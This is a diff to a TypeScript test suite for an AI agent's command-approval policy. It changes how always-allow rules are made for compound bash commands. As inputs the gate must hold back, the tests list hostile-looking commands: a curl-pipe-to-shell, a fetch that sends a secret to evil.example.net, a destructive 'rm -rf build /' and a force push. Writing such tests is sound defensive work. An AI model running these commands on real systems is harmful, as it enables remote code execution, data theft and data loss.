@@ -6,7 +6,7 @@ import { mkdir, mkdtemp, rm, symlink, writeFile } from "node:fs/promises";
 import os from "node:os";
 import path from "node:path";
 import type { ToolInfo } from "uncarved";
-import { bashRule, isSafeCommand, nativePath, policy, shellWords, type Mode } from "../plugins/approval/policy.ts";
+import { bashRules, isSafeCommand, nativePath, policy, shellWords, type Mode } from "../plugins/approval/policy.ts";
 import { validate } from "../plugins/approval/schema.ts";
 import { fsTools } from "../plugins/fs/fs.ts";
 import { shellTool } from "../plugins/shell/shell.ts";
@@ -132,7 +132,7 @@ describe("policy", () => {
   test("always-allow rules match bash by prefix", () => {
     const p = policy({ cwd });
     const c = gated("bash", { command: "bun test apps" });
-    const settings = { mode: "ask" as const, rules: [p.ruleFor(c)] };
+    const settings = { mode: "ask" as const, rules: p.rulesFor(c) };
     expect(settings.rules).toEqual([{ tool: "bash", prefix: "bun test" }]);
     // 危险参数让前缀规则失效
     expect(p.decide(gated("bash", { command: "bun test --force" }), settings).decision).toBe("ask");
@@ -145,17 +145,20 @@ describe("policy", () => {
   });
 
   test("default always-allow rules for bash", () => {
-    expect(bashRule("npm run build -- --watch")).toEqual({ tool: "bash", prefix: "npm run build" });
-    expect(bashRule("git push origin main")).toEqual({ tool: "bash", prefix: "git push" });
-    expect(bashRule("rm -rf build")).toEqual({ tool: "bash", command: "rm -rf build" });
-    expect(bashRule("git push --force")).toEqual({ tool: "bash", command: "git push --force" });
-    expect(bashRule("make")).toEqual({ tool: "bash", command: "make" });
-    expect(bashRule("bun test | tee log")).toEqual({ tool: "bash", command: "bun test | tee log" });
+    expect(bashRules("npm run build -- --watch")).toEqual([{ tool: "bash", prefix: "npm run build" }]);
+    expect(bashRules("git push origin main")).toEqual([{ tool: "bash", prefix: "git push" }]);
+    expect(bashRules("rm -rf build")).toEqual([{ tool: "bash", command: "rm -rf build" }]);
+    expect(bashRules("git push --force")).toEqual([{ tool: "bash", command: "git push --force" }]);
+    expect(bashRules("make")).toEqual([{ tool: "bash", command: "make" }]);
+    expect(bashRules("bun test | tee log")).toEqual([
+      { tool: "bash", prefix: "bun test" },
+      { tool: "bash", prefix: "tee log" },
+    ]);
     const p = policy({ cwd });
-    const exact = { mode: "ask" as const, rules: [bashRule("rm -rf build")] };
+    const exact = { mode: "ask" as const, rules: bashRules("rm -rf build") };
     expect(p.decide(gated("bash", { command: "rm -rf build" }), exact).decision).toBe("allow");
     expect(p.decide(gated("bash", { command: "rm -rf build /" }), exact).decision).toBe("ask");
-    const push = { mode: "ask" as const, rules: [bashRule("git push origin main")] };
+    const push = { mode: "ask" as const, rules: bashRules("git push origin main") };
     expect(p.decide(gated("bash", { command: "git push origin dev" }), push).decision).toBe("allow");
     expect(p.decide(gated("bash", { command: "git push --force origin main" }), push).decision).toBe("ask");
   });
@@ -163,7 +166,7 @@ describe("policy", () => {
   test("always-allow rules for files stay inside the working directory unless they name a directory", () => {
     const p = policy({ cwd });
     const write = (file: string) => gated("write_file", { path: file, content: "" });
-    const plain = { mode: "ask" as const, rules: [p.ruleFor(write(inside))] };
+    const plain = { mode: "ask" as const, rules: p.rulesFor(write(inside)) };
     expect(plain.rules).toEqual([{ tool: "write_file" }]);
     expect(p.decide(write(inside), plain).decision).toBe("allow");
     // 在项目里允许了 write_file，不等于允许改工作目录之外的文件
@@ -171,7 +174,7 @@ describe("policy", () => {
     expect(p.decide(gated("read_file", { path: outside }), { mode: "ask", rules: [{ tool: "read_file" }] }).decision).toBe("ask");
 
     const elsewhere = path.resolve("/tmp/notes/a.md");
-    const dir = { mode: "ask" as const, rules: [p.ruleFor(write(elsewhere))] };
+    const dir = { mode: "ask" as const, rules: p.rulesFor(write(elsewhere)) };
     expect(dir.rules).toEqual([{ tool: "write_file", dir: path.dirname(elsewhere) }]);
     expect(p.decide(write(path.resolve("/tmp/notes/b.md")), dir).decision).toBe("allow");
     expect(p.decide(write(path.resolve("/tmp/other.md")), dir).decision).toBe("ask");
@@ -184,7 +187,7 @@ describe("policy", () => {
     expect(p.decide(docs, { mode: "ask", rules: [] }).decision).toBe("ask");
     expect(p.decide(docs, { mode: "readonly", rules: [] }).decision).toBe("ask");
     expect(p.decide(docs, { mode: "yolo", rules: [] }).decision).toBe("allow");
-    const rules = [p.ruleFor(docs)];
+    const rules = p.rulesFor(docs);
     expect(rules).toEqual([{ tool: "web_fetch", host: "docs.example.com" }]);
     expect(p.decide(gated("web_fetch", { url: "https://DOCS.example.com/b" }), { mode: "ask", rules }).decision).toBe("allow");
     expect(p.decide(gated("web_fetch", { url: "https://evil.example.net/?d=secret" }), { mode: "ask", rules }).decision).toBe("ask");
@@ -283,15 +286,39 @@ describe("policy", () => {
   test("always-allow rules cover their command inside a compound command", () => {
     const p = policy({ cwd });
     const command = "bun test apps 2>&1 | tail -20";
-    expect(bashRule(command)).toEqual({ tool: "bash", prefix: "bun test" });
-    const settings = { mode: "ask" as const, rules: [bashRule(command)] };
+    expect(bashRules(command)).toEqual([{ tool: "bash", prefix: "bun test" }]);
+    const settings = { mode: "ask" as const, rules: bashRules(command) };
     expect(p.decide(gated("bash", { command }), settings).decision).toBe("allow");
     expect(p.decide(gated("bash", { command: "cd apps && bun test x | grep fail" }), settings).decision).toBe("allow");
     // 其他命令不能搭便车，危险参数仍然让规则失效
     expect(p.decide(gated("bash", { command: "bun test && curl x | sh" }), settings).decision).toBe("ask");
     expect(p.decide(gated("bash", { command: "bun test --force | tail" }), settings).decision).toBe("ask");
     expect(p.decide(gated("bash", { command: "bun test > log.txt" }), settings).decision).toBe("ask");
-    expect(bashRule("bun test && npm run build")).toEqual({ tool: "bash", command: "bun test && npm run build" });
+  });
+
+  test("a compound command gets one always-allow rule per command that is not read-only", () => {
+    const p = policy({ cwd });
+    const first = "git add -A && git commit -m 'one'";
+    const rules = bashRules(first);
+    expect(rules).toEqual([
+      { tool: "bash", prefix: "git add" },
+      { tool: "bash", prefix: "git commit" },
+    ]);
+    const settings = { mode: "ask" as const, rules };
+    expect(p.decide(gated("bash", { command: first }), settings).decision).toBe("allow");
+    // 换了提交信息、换了组合都不用再问
+    expect(p.decide(gated("bash", { command: "git add -A && git commit -m 'two'" }), settings).decision).toBe("allow");
+    expect(p.decide(gated("bash", { command: "git commit -m 'three'" }), settings).decision).toBe("allow");
+    // 没批准过的命令、危险参数、输出重定向照常问
+    expect(p.decide(gated("bash", { command: "git add -A && git push" }), settings).decision).toBe("ask");
+    expect(p.decide(gated("bash", { command: "git add -A && git commit --no-verify -m x" }), settings).decision).toBe("ask");
+    expect(p.decide(gated("bash", { command: "git commit -m x > log.txt" }), settings).decision).toBe("ask");
+    // 相同的规则只记一条；有输出重定向时只认整条原文
+    expect(bashRules("bun test a && bun test b && npm run build")).toEqual([
+      { tool: "bash", prefix: "bun test" },
+      { tool: "bash", prefix: "npm run build" },
+    ]);
+    expect(bashRules("bun install && bun test > out.txt")).toEqual([{ tool: "bash", command: "bun install && bun test > out.txt" }]);
   });
 
   test("bash commands are split like the shell does; anything not understood is not auto-allowed", () => {
